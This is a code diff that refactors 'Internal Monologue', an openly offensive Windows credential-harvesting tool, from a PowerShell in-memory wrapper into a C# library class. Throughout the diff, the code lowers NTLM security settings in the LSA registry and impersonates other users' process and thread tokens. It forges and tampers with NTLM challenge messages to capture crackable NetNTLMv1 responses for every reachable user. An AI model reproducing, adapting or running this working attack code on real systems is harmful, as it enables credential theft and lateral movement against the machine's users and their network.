@@ -1,24 +1,4 @@
-function Invoke-InternalMonologue
-{
-<#
-.SYNOPSIS
-Retrieves NTLMv1 challenge-response for all available users
-
-.DESCRIPTION
-Downgrades to NTLMv1, impersonates all available users and retrieves a challenge-response for each.
-	
-Author: Elad Shamir (https://linkedin.com/in/eladshamir)
-
-.EXAMPLE
-Invoke-InternalMonologue
-
-.LINK
-https://github.com/eladshamir/Internal-Monologue
-
-#>
-
-$Source = @"
-using System;
+﻿using System;
 using System.Security.Principal;
 using System.Runtime.InteropServices;
 using System.Text;
@@ -29,8 +9,22 @@ using System.Text.RegularExpressions;
 
 namespace InternalMonologue
 {
-    public class Program
+    public class InternalMonologue
     {
+        public InternalMonologue() { }
+        public InternalMonologue(bool impersonate = true, bool threads = false, bool downgrade = true, bool restore = true, string challenge = "1122334455667788", bool verbose = false)
+        {
+            this.impersonate = impersonate;
+            this.threads = threads;
+            this.downgrade = downgrade;
+            this.restore = restore;
+            this.challenge = challenge;
+            this.verbose = verbose;
+        }
+
+        bool impersonate = true, threads = false, downgrade = true, restore = true, verbose = false, isElevated = false;
+        string challenge = "1122334455667788";
+
         const int MAX_TOKEN_SIZE = 12288;
 
         struct TOKEN_USER
@@ -89,7 +83,7 @@ namespace InternalMonologue
         [DllImport("secur32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         static extern int InitializeSecurityContext(
             ref SECURITY_HANDLE phCredential,
-            ref SECURITY_HANDLE phContext,  
+            ref SECURITY_HANDLE phContext,
             string pszTargetName,
             int fContextReq,
             int Reserved1,
@@ -100,6 +94,17 @@ namespace InternalMonologue
             out SecBufferDesc pOutput,
             out uint pfContextAttr,
             out SECURITY_INTEGER ptsExpiry);
+
+        [DllImport("secur32.dll", SetLastError = true)]
+        static extern int AcceptSecurityContext(ref SECURITY_HANDLE phCredential,
+            IntPtr phContext,
+            ref SecBufferDesc pInput,
+            uint fContextReq,
+            uint TargetDataRep,
+            out SECURITY_HANDLE phNewContext,
+            out SecBufferDesc pOutput,
+            out uint pfContextAttr,
+            out SECURITY_INTEGER ptsTimeStamp);
 
         [DllImport("advapi32.dll", SetLastError = true)]
         private static extern bool OpenProcessToken(
@@ -139,7 +144,7 @@ namespace InternalMonologue
         static extern IntPtr OpenThread(int dwDesiredAccess, bool bInheritHandle,
             IntPtr dwThreadId);
 
-        private static void GetRegKey(string key, string name, out object result)
+        private void GetRegKey(string key, string name, out object result)
         {
             RegistryKey Lsa = Registry.LocalMachine.OpenSubKey(key);
             if (Lsa != null)
@@ -154,7 +159,7 @@ namespace InternalMonologue
             result = null;
         }
 
-        private static void SetRegKey(string key, string name, object value)
+        private void SetRegKey(string key, string name, object value)
         {
             RegistryKey Lsa = Registry.LocalMachine.OpenSubKey(key, true);
             if (Lsa != null)
@@ -170,7 +175,7 @@ namespace InternalMonologue
             }
         }
 
-        private static void ExtendedNTLMDowngrade(out object oldValue_LMCompatibilityLevel, out object oldValue_NtlmMinClientSec, out object oldValue_RestrictSendingNTLMTraffic)
+        private void ExtendedNTLMDowngrade(out object oldValue_LMCompatibilityLevel, out object oldValue_NtlmMinClientSec, out object oldValue_RestrictSendingNTLMTraffic)
         {
             GetRegKey("SYSTEM\\CurrentControlSet\\Control\\Lsa", "LMCompatibilityLevel", out oldValue_LMCompatibilityLevel);
             SetRegKey("SYSTEM\\CurrentControlSet\\Control\\Lsa", "LMCompatibilityLevel", 2);
@@ -182,7 +187,7 @@ namespace InternalMonologue
             SetRegKey("SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0", "RestrictSendingNTLMTraffic", 0);
         }
 
-        private static void NTLMRestore(object oldValue_LMCompatibilityLevel, object oldValue_NtlmMinClientSec, object oldValue_RestrictSendingNTLMTraffic)
+        private void NTLMRestore(object oldValue_LMCompatibilityLevel, object oldValue_NtlmMinClientSec, object oldValue_RestrictSendingNTLMTraffic)
         {
             SetRegKey("SYSTEM\\CurrentControlSet\\Control\\Lsa", "LMCompatibilityLevel", oldValue_LMCompatibilityLevel);
             SetRegKey("SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0", "NtlmMinClientSec", oldValue_NtlmMinClientSec);
@@ -190,7 +195,7 @@ namespace InternalMonologue
         }
 
         //Retrieves the SID of a given token
-        public static string GetLogonId(IntPtr token)
+        public string GetLogonId(IntPtr token)
         {
             string SID = null;
             try
@@ -213,15 +218,36 @@ namespace InternalMonologue
 
                 return SID;
             }
-            catch (Exception e)
+            catch
             {
                 CloseHandle(token);
                 return null;
             }
         }
 
-        public static void HandleProcess(Process process, string challenge, bool verbose)
+        public bool ValidateSID(string SID, bool verbose)
         {
+            if (SID.IsNullOrWhiteSpace())
+            {
+                return false;
+            }
+
+            if (authenticatedUsers.Contains(SID) == true)
+            {
+                //Check if the user has been handled previously
+                return false;
+            }
+            if (SID == "S-1-5-18" || SID == "S-1-5-19" || SID == "S-1-5-20" || SID == "S-1-5-96-0-0" || SID == "S-1-5-96-0-1" || SID == "S-1-5-90-0-1")
+            {
+                //do not touch processes owned by system, local service, network service, font driver host, or window manager
+                return false;
+            }
+            return true; //Check if the SID is OPSEC safe
+        }
+
+        public InternalMonologueConsole HandleProcess(Process process, string challenge, bool verbose)
+        {
+            var console = new InternalMonologueConsole();
             try
             {
                 var token = IntPtr.Zero;
@@ -233,60 +259,63 @@ namespace InternalMonologue
                     //Get the SID of the token
                     SID = GetLogonId(token);
                     CloseHandle(token);
-
-                    //Check if this user hasn't been handled yet
-                    if (SID != null && authenticatedUsers.Contains(SID) == false)
+                    if (!ValidateSID(SID, verbose))
                     {
-                        if (OpenProcessToken(process.Handle, 0x0002, ref token))
+                        return null;
+                    }
+
+                    if (verbose) console.AddConsole(string.Format("{0} {1}\n", SID, process.ProcessName));
+                    if (OpenProcessToken(process.Handle, 0x0002, ref token))
+                    {
+                        var sa = new SECURITY_ATTRIBUTES();
+                        sa.nLength = Marshal.SizeOf(sa);
+
+                        DuplicateTokenEx(
+                            token,
+                            0x0002 | 0x0008,
+                            ref sa,
+                            (int)SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
+                            (int)1,
+                            ref dupToken);
+
+                        CloseHandle(token);
+
+                        try
                         {
-                            var sa = new SECURITY_ATTRIBUTES();
-                            sa.nLength = Marshal.SizeOf(sa);
-
-                            DuplicateTokenEx(
-                                token,
-                                0x0002 | 0x0008,
-                                ref sa,
-                                (int)SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
-                                (int)1,
-                                ref dupToken);
-
-                            CloseHandle(token);
-
-                            try
+                            using (WindowsImpersonationContext impersonatedUser = WindowsIdentity.Impersonate(dupToken))
                             {
-                                using (WindowsImpersonationContext impersonatedUser = WindowsIdentity.Impersonate(dupToken))
+                                if (verbose == true) console.AddConsole(string.Format("Impersonated user {0}\n", WindowsIdentity.GetCurrent().Name));
+                                var result = InternalMonologueForCurrentUser(challenge, true);
+                                //Ensure it is a valid response and not blank
+                                if (!result.Resp1.IsNullOrWhiteSpace())
                                 {
-                                    if (verbose == true) Console.WriteLine("Impersonated user " + WindowsIdentity.GetCurrent().Name);
-                                    string result = InternalMonologueForCurrentUser(challenge);
-                                    //Ensure it is a valid response and not blank
-                                    if (result != null && result.Length > 0)
-                                    {
-                                        Console.WriteLine(result);
-                                        authenticatedUsers.Add(SID);
-                                    }
-                                    else if (verbose == true) { Console.WriteLine("Got blank response for user " + WindowsIdentity.GetCurrent().Name); }
+                                    console.AddResponse(result);
+                                    console.AddConsole(string.Format("{0}\n", result.ToString()));
+                                    authenticatedUsers.Add(SID);
                                 }
+                                else if (verbose == true) { console.AddConsole(string.Format("Got blank response for user {0}\n", WindowsIdentity.GetCurrent().Name)); }
                             }
-                            catch (Exception e)
-                            { /*Does not need to do anything if it fails*/ }
-                            finally
-                            {
-                                CloseHandle(dupToken);
-                            }
+                        }
+                        catch
+                        { /*Does not need to do anything if it fails*/ }
+                        finally
+                        {
+                            CloseHandle(dupToken);
                         }
                     }
                 }
             }
             catch (Exception)
             { /*Does not need to do anything if it fails*/ }
+            return console;
         }
 
-        public static void HandleThread(ProcessThread thread, string challenge, bool verbose)
+        public InternalMonologueConsole HandleThread(ProcessThread thread, string challenge, bool verbose)
         {
+            var console = new InternalMonologueConsole();
             try
             {
                 var token = IntPtr.Zero;
-                var dupToken = IntPtr.Zero;
                 string SID = null;
 
                 //Try to get thread handle
@@ -295,7 +324,7 @@ namespace InternalMonologue
                 //If failed, return
                 if (handle == IntPtr.Zero)
                 {
-                    return;
+                    return null;
                 }
 
                 if (OpenThreadToken(handle, 0x0008, true, ref token))
@@ -303,193 +332,117 @@ namespace InternalMonologue
                     //Get the SID of the token
                     SID = GetLogonId(token);
                     CloseHandle(token);
-
-                    //Check if this user hasn't been handled yet
-                    if (SID != null && authenticatedUsers.Contains(SID) == false)
+                    if (!ValidateSID(SID, verbose))
                     {
-                        if (OpenThreadToken(handle, 0x0002, true, ref token))
+                        return null;
+                    }
+
+                    if (OpenThreadToken(handle, 0x0002, true, ref token))
+                    {
+                        var sa = new SECURITY_ATTRIBUTES();
+                        sa.nLength = Marshal.SizeOf(sa);
+                        var dupToken = IntPtr.Zero;
+
+                        DuplicateTokenEx(
+                            token,
+                            0x0002 | 0x0008,
+                            ref sa,
+                            (int)SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
+                            (int)1,
+                            ref dupToken);
+
+                        CloseHandle(token);
+
+                        try
                         {
-                            var sa = new SECURITY_ATTRIBUTES();
-                            sa.nLength = Marshal.SizeOf(sa);
-
-                            DuplicateTokenEx(
-                                token,
-                                0x0002 | 0x0008,
-                                ref sa,
-                                (int)SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
-                                (int)1,
-                                ref dupToken);
-
-                            CloseHandle(token);
-
-                            try
+                            using (WindowsImpersonationContext impersonatedUser = WindowsIdentity.Impersonate(dupToken))
                             {
-                                using (WindowsImpersonationContext impersonatedUser = WindowsIdentity.Impersonate(dupToken))
+                                if (verbose == true) console.AddConsole(string.Format("Impersonated user {0}\n", WindowsIdentity.GetCurrent().Name));
+                                var result = InternalMonologueForCurrentUser(challenge, true);
+                                //Ensure it is a valid response and not blank
+                                if (!result.Resp1.IsNullOrWhiteSpace())
                                 {
-                                    if (verbose == true) Console.WriteLine("Impersonated user " + WindowsIdentity.GetCurrent().Name);
-                                    string result = InternalMonologueForCurrentUser(challenge);
-                                    //Ensure it is a valid response and not blank
-                                    if (result != null && result.Length > 0)
-                                    {
-                                        Console.WriteLine(result);
-                                        authenticatedUsers.Add(SID);
-                                    }
-                                    else if (verbose == true) { Console.WriteLine("Got blank response for user " + WindowsIdentity.GetCurrent().Name); }
+                                    console.AddResponse(result); //rich data object for consumer classes
+                                    console.AddConsole(string.Format("{0}\n", result));
+                                    authenticatedUsers.Add(SID);
                                 }
+                                else if (verbose == true) { console.AddConsole(string.Format("Got blank response for user {0}\n", WindowsIdentity.GetCurrent().Name)); }
                             }
-                            catch (Exception e)
-                            { /*Does not need to do anything if it fails*/ }
-                            finally
-                            {
-                                CloseHandle(dupToken);
-                            }
+                        }
+                        catch
+                        { /*Does not need to do anything if it fails*/ }
+                        finally
+                        {
+                            CloseHandle(dupToken);
                         }
                     }
                 }
             }
             catch (Exception)
             { /*Does not need to do anything if it fails*/ }
+            return console;
         }
 
         //Maintains a list of handled users
-        static List<string> authenticatedUsers = new List<string>();
+        private List<string> authenticatedUsers = new List<string>();
 
-        //Parse command line arguments
-        static Dictionary<string, string> ParseArgs(string[] args)
+
+        public InternalMonologueConsole Go()
         {
-            Dictionary<string, string> ret = new Dictionary<string, string>();
-            if (args.Length % 2 == 0 && args.Length > 0)
-            {
-                for (int i = 0; i < args.Length; i = i + 2)
-                {
-                    ret.Add(args[i].Substring(1).ToLower(), args[i + 1].ToLower());
-                }
-            }
-            return ret;
-        }
-
-        private static void PrintError(string message)
-        {
-            Console.WriteLine();
-            Console.WriteLine("Error: " + message);
-            PrintHelp();
-        }
-
-        private static void PrintHelp()
-        {
-            Console.WriteLine();
-            Console.WriteLine("Usage:");
-            Console.WriteLine("InternalMonologue -Downgrade True/False -Restore True/False - Impersonate True/False -Verbose True/False -Challenge ascii-hex");
-            Console.WriteLine("Example:");
-            Console.WriteLine("InternalMonologue -Downgrade False -Restore False -Impersonate True -Verbose False -Challenge 1122334455667788");
-            Console.WriteLine();
-            Console.WriteLine("Downgrade - Specifies whether to perform an NTLM downgrade or not [True/False]. Optional. Defult is true.");
-            Console.WriteLine("Restore - Specifies whether to restore the original values from before the NTLM downgrade or not [True/False]. Optional. Defult is true.");
-            Console.WriteLine("Impersonate - Specifies whether to try to impersonate all other available users or not [True/False]. Optional. Defult is true.");
-            Console.WriteLine("Verbose - Specifies whether print verbose output or not [True/False]. Optional. Defult is false.");
-            Console.WriteLine("Challenge - Specifies the NTLM challenge to be used. An 8-byte long value in ascii-hex representation. Optional. Defult is 1122334455667788.");
-            Console.WriteLine();
-        }
-
-        public static void Main(string[] args)
-        {
-            Dictionary<string, string> argDict = ParseArgs(args);
-            //Set defaults
-            bool impersonate = true, downgrade = true, restore = true, verbose = false;
-            string challenge = "1122334455667788";
-
-            if (args.Length > 0 && argDict.Count == 0)
-            {
-                PrintHelp();
-                return;
-            }
-            else if (args.Length == 0)
-            {
-                Console.Error.WriteLine("Running with default settings. Type -Help for more information.\n");
-
-            }
-
-            if (argDict.ContainsKey("impersonate"))
-            {
-                if (bool.TryParse(argDict["impersonate"], out impersonate) == false)
-                {
-                    PrintError("Impersonate must be a boolean value (True/False)");
-                    return;
-                }
-            }
-            if (argDict.ContainsKey("downgrade"))
-            {
-                if (bool.TryParse(argDict["downgrade"], out downgrade) == false)
-                {
-                    PrintError("Downgrade must be a boolean value (True/False)");
-                    return;
-                }
-            }
-            if (argDict.ContainsKey("restore"))
-            {
-                if (bool.TryParse(argDict["restore"], out restore) == false)
-                {
-                    PrintError("Restore must be a boolean value (True/False)");
-                    return;
-                }
-            }
-            if (argDict.ContainsKey("verbose"))
-            {
-                if (bool.TryParse(argDict["verbose"], out verbose) == false)
-                {
-                    PrintError("Verbose must be a boolean value (True/False)");
-                    return;
-                }
-            }
-            if (argDict.ContainsKey("challenge"))
-            {
-                challenge = argDict["challenge"].ToUpper();
-                if (Regex.IsMatch(challenge, @"^[0-9A-F]{16}$") == false)
-                {
-                    PrintError("Challenge must be a 8-byte long value in asciihex representation.  (e.g. 1122334455667788)");
-                    return;
-                }
-            }
-
-
+            var console = new InternalMonologueConsole();
             //Extended NetNTLM Downgrade and impersonation can only work if the current process is elevated
-            if (IsElevated())
+            isElevated = IsElevated();
+            if (isElevated)
             {
-                if (verbose == true) Console.WriteLine("Running elevated");
+                if (verbose == true) console.AddConsole("Running elevated\n");
                 object oldValue_LMCompatibilityLevel = null;
                 object oldValue_NtlmMinClientSec = null;
                 object oldValue_RestrictSendingNTLMTraffic = null;
                 if (downgrade == true)
                 {
-                    if (verbose == true) Console.WriteLine("Performing NTLM Downgrade");
+                    if (verbose == true) console.AddConsole("Performing NTLM Downgrade\n");
                     //Perform an Extended NetNTLM Downgrade and store the current values to restore them later
                     ExtendedNTLMDowngrade(out oldValue_LMCompatibilityLevel, out oldValue_NtlmMinClientSec, out oldValue_RestrictSendingNTLMTraffic);
                 }
 
                 if (impersonate == true)
                 {
-                    if (verbose == true) Console.WriteLine("Starting impersonation");
+                    if (verbose == true) console.AddConsole("Starting impersonation\n");
                     foreach (Process process in Process.GetProcesses())
                     {
-                        if (process.ProcessName.Contains("lsass") == false) // Do not touch LSASS
+                        var response = HandleProcess(process, challenge, verbose);
+                        if (response != null)
                         {
-                            HandleProcess(process, challenge, verbose);
-                            foreach (ProcessThread thread in process.Threads)
+                            console.AddConsole(string.Format("{0}\n", response.Output()));
+                            console.AddResponses(response.Responses);
+                        }
+                        if (!threads)
+                        {
+                            continue;
+                        }
+                        foreach (ProcessThread thread in process.Threads)
+                        {
+                            response = HandleThread(thread, challenge, verbose);
+                            if (response == null)
                             {
-                                HandleThread(thread, challenge, verbose);
+                                continue;
                             }
+                            console.AddConsole(string.Format("{0}\n", response.Output()));
+                            console.AddResponses(response.Responses);
                         }
                     }
                 }
                 else
                 {
-                    if (verbose == true) Console.WriteLine("Performing attack on current user only (no impersonation)");
-                    Console.WriteLine(InternalMonologueForCurrentUser(challenge));
+                    if (verbose == true) console.AddConsole("Performing attack on current user only (no impersonation)\n");
+                    var response = InternalMonologueForCurrentUser(challenge, true);
+                    console.AddResponse(response);
+                    console.AddConsole(string.Format("{0}\n", response.ToString()));
                 }
 
                 if (downgrade == true && restore == true)
                 {
-                    if (verbose == true) Console.WriteLine("Restoring NTLM values");
+                    if (verbose == true) console.AddConsole("Restoring NTLM values\n");
                     //Undo changes made in the Extended NetNTLM Downgrade
                     NTLMRestore(oldValue_LMCompatibilityLevel, oldValue_NtlmMinClientSec, oldValue_RestrictSendingNTLMTraffic);
                 }
@@ -497,40 +450,48 @@ namespace InternalMonologue
             else
             {
                 //If the process is not elevated, skip downgrade and impersonation and only perform an Internal Monologue Attack for the current user
-                if (verbose == true) Console.WriteLine("Not elevated. Performing attack with current NTLM settings on current user");
-                Console.WriteLine(InternalMonologueForCurrentUser(challenge));
-            }           
+                if (verbose == true) console.AddConsole("Not elevated. Performing attack with current NTLM settings on current user\n");
+                var response = InternalMonologueForCurrentUser(challenge, true);
+                console.AddResponse(response);
+                console.AddConsole(string.Format("{0}\n", response.ToString()));
+            }
+#if DEBUG
+            Console.WriteLine(console.Output());
+#endif
+            return console;
         }
 
         //This function performs an Internal Monologue Attack in the context of the current user and returns the NetNTLM response for the challenge 0x1122334455667788
-        private static string InternalMonologueForCurrentUser(string challenge)
+        private InternalMonologueResponse InternalMonologueForCurrentUser(string challenge, bool DisableESS)
         {
             SecBufferDesc ClientToken = new SecBufferDesc(MAX_TOKEN_SIZE);
+            SecBufferDesc ServerToken = new SecBufferDesc(MAX_TOKEN_SIZE);
 
-            SECURITY_HANDLE _hOutboundCred;
-                _hOutboundCred.LowPart = _hOutboundCred.HighPart = IntPtr.Zero;
+            SECURITY_HANDLE _hCred;
+            _hCred.LowPart = _hCred.HighPart = IntPtr.Zero;
             SECURITY_INTEGER ClientLifeTime;
-                ClientLifeTime.LowPart = 0;
-                ClientLifeTime.HighPart = 0;
+            ClientLifeTime.LowPart = 0;
+            ClientLifeTime.HighPart = 0;
             SECURITY_HANDLE _hClientContext;
+            SECURITY_HANDLE _hServerContext;
             uint ContextAttributes = 0;
 
             // Acquire credentials handle for current user
             AcquireCredentialsHandle(
                 WindowsIdentity.GetCurrent().Name,
                 "NTLM",
-                2,
+                3,
                 IntPtr.Zero,
                 IntPtr.Zero,
                 0,
                 IntPtr.Zero,
-                ref _hOutboundCred,
+                ref _hCred,
                 ref ClientLifeTime
                 );
 
             // Get a type-1 message from NTLM SSP
             InitializeSecurityContext(
-                ref _hOutboundCred,
+                ref _hCred,
                 IntPtr.Zero,
                 WindowsIdentity.GetCurrent().Name,
                 0x00000800,
@@ -543,15 +504,37 @@ namespace InternalMonologue
                 out ContextAttributes,
                 out ClientLifeTime
                 );
-            ClientToken.Dispose();
+
+            // Get a type-2 message from NTLM SSP (Server)
+            AcceptSecurityContext(
+                ref _hCred,
+                IntPtr.Zero,
+                ref ClientToken,
+                0x00000800,
+                0x10,
+                out _hServerContext,
+                out ServerToken,
+                out ContextAttributes,
+                out ClientLifeTime
+                );
+
+            // Tamper with the CHALLENGE message
+            byte[] serverMessage = ServerToken.GetSecBufferByteArray();
+            byte[] challengeBytes = StringToByteArray(challenge);
+            if (DisableESS)
+            {
+                serverMessage[22] = (byte)(serverMessage[22] & 0xF7);
+            }
+            //Replace Challenge
+            Array.Copy(challengeBytes, 0, serverMessage, 24, 8);
+            //Reset reserved bytes to avoid local authentication
+            Array.Copy(new byte[16], 0, serverMessage, 32, 16);
+
+            ServerToken = new SecBufferDesc(serverMessage);
 
             ClientToken = new SecBufferDesc(MAX_TOKEN_SIZE);
-
-            // Custom made type-2 message with the specified challenge
-            byte[] challengeBytes = StringToByteArray(challenge);
-            SecBufferDesc ServerToken = new SecBufferDesc(new byte[] { 78, 84, 76, 77, 83, 83, 80, 0, 2, 0, 0, 0, 0, 0, 0, 0, 40, 0, 0, 0, 1, 0x82, 0, 0, challengeBytes[0], challengeBytes[1], challengeBytes[2], challengeBytes[3], challengeBytes[4], challengeBytes[5], challengeBytes[6], challengeBytes[7], 0, 0, 0, 0, 0, 0, 0 });
-            InitializeSecurityContext(
-                ref _hOutboundCred,
+            int resCode = InitializeSecurityContext(
+                ref _hCred,
                 ref _hClientContext,
                 WindowsIdentity.GetCurrent().Name,
                 0x00000800,
@@ -564,6 +547,16 @@ namespace InternalMonologue
                 out ContextAttributes,
                 out ClientLifeTime
                 );
+
+            //If failed, retry without disabling ESS
+            if (resCode != 0 && DisableESS)
+            {
+                ClientToken.Dispose();
+                ServerToken.Dispose();
+
+                return InternalMonologueForCurrentUser(challenge, false);
+            }
+
             byte[] result = ClientToken.GetSecBufferByteArray();
 
             ClientToken.Dispose();
@@ -574,16 +567,16 @@ namespace InternalMonologue
         }
 
         //This function parses the NetNTLM response from a type-3 message
-        private static string ParseNTResponse(byte[] message, string challenge)
+        private InternalMonologueResponse ParseNTResponse(byte[] message, string challenge)
         {
-            short lm_resp_len = Convert.ToInt16(message[12] + message[13] * 256);
-            short lm_resp_off = Convert.ToInt16(message[16] + message[17] * 256);
-            short nt_resp_len = Convert.ToInt16(message[20] + message[21] * 256);
-            short nt_resp_off = Convert.ToInt16(message[24] + message[25] * 256);
-            short domain_len = Convert.ToInt16(message[28] + message[29] * 256);
-            short domain_off = Convert.ToInt16(message[32] + message[33] * 256);
-            short user_len = Convert.ToInt16(message[36] + message[37] * 256);
-            short user_off = Convert.ToInt16(message[40] + message[41] * 256);
+            ushort lm_resp_len = BitConverter.ToUInt16(message, 12);
+            uint lm_resp_off = BitConverter.ToUInt32(message, 16);
+            ushort nt_resp_len = BitConverter.ToUInt16(message, 20);
+            uint nt_resp_off = BitConverter.ToUInt32(message, 24);
+            ushort domain_len = BitConverter.ToUInt16(message, 28);
+            uint domain_off = BitConverter.ToUInt32(message, 32);
+            ushort user_len = BitConverter.ToUInt16(message, 36);
+            uint user_off = BitConverter.ToUInt32(message, 40);
             byte[] lm_resp = new byte[lm_resp_len];
             byte[] nt_resp = new byte[nt_resp_len];
             byte[] domain = new byte[domain_len];
@@ -593,16 +586,29 @@ namespace InternalMonologue
             Array.Copy(message, domain_off, domain, 0, domain_len);
             Array.Copy(message, user_off, user, 0, user_len);
 
-            string result = null;
+            var result = new InternalMonologueResponse();
+            result.NtlmDowngrade = downgrade;
+            result.FromElevated = isElevated;
+            result.Challenge = challenge;
+            result.ImpersonatedIdentity = WindowsIdentity.GetCurrent().Name;
+            result.SID = WindowsIdentity.GetCurrent().User.ToString();
             if (nt_resp_len == 24)
             {
-                result = ConvertHex(ByteArrayToString(user)) + "::" + ConvertHex(ByteArrayToString(domain)) + ":" + ByteArrayToString(lm_resp) + ":" + ByteArrayToString(nt_resp) + ":" + challenge;
+                result.UserName = ConvertHex(ByteArrayToString(user));
+                result.Domain = ConvertHex(ByteArrayToString(domain));
+                result.Resp1 = ByteArrayToString(lm_resp);
+                result.Resp2 = ByteArrayToString(nt_resp);
+//                result = ConvertHex(ByteArrayToString(user)) + "::" + ConvertHex(ByteArrayToString(domain)) + ":" + ByteArrayToString(lm_resp) + ":" + ByteArrayToString(nt_resp) + ":" + challenge;
             }
             else if (nt_resp_len > 24)
             {
-                result = ConvertHex(ByteArrayToString(user)) + "::" + ConvertHex(ByteArrayToString(domain)) + ":" + challenge + ":" + ByteArrayToString(nt_resp).Substring(0,32) + ":" + ByteArrayToString(nt_resp).Substring(32);
+                result.UserName = ConvertHex(ByteArrayToString(user));
+                result.Domain = ConvertHex(ByteArrayToString(domain));
+                result.Resp1 = ByteArrayToString(nt_resp).Substring(0, 32);
+                result.Resp2 = ByteArrayToString(nt_resp).Substring(32);
+                //result = ConvertHex(ByteArrayToString(user)) + "::" + ConvertHex(ByteArrayToString(domain)) + ":" + challenge + ":" + ByteArrayToString(nt_resp).Substring(0, 32) + ":" + ByteArrayToString(nt_resp).Substring(32);
             }
-            
+
             return result;
         }
 
@@ -662,7 +668,7 @@ namespace InternalMonologue
 
             }
 
-            return ascii;         
+            return ascii;
         }
     }
 
@@ -827,16 +833,4 @@ namespace InternalMonologue
         SecurityImpersonation,
         SecurityDelegation
     }
-}
-
-"@
-
-$inmem=New-Object -TypeName System.CodeDom.Compiler.CompilerParameters
-$inmem.GenerateInMemory=1
-$inmem.ReferencedAssemblies.AddRange($(@("System.dll", $([PSObject].Assembly.Location))))
-
-Add-Type -TypeDefinition $Source -Language CSharp -CompilerParameters $inmem 
-
-[InternalMonologue.Program]::Main($args)
-
 }
